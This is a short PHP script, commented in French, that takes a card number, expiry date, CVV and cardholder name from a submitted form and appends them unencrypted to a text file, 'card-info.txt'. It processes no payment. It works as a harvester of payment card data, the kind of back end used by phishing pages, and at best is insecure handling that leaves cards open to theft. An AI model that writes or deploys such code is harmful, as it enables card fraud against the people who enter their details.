<?php

// Récupération des données envoyées par le formulaire
$cardNumber = $_POST['card-number'];
$expirationDate = $_POST['expiration-date'];
$cvv = $_POST['cvv'];
$cardholderName = $_POST['cardholder-name'];

// Construction du message à enregistrer dans le fichier texte
$message = "Numéro de carte : $cardNumber\nDate d'expiration : $expirationDate\nCVV : $cvv\nNom du titulaire de la carte : $cardholderName\n\n";

// Enregistrement du message dans le fichier texte
file_put_contents('card-info.txt', $message, FILE_APPEND);

?>
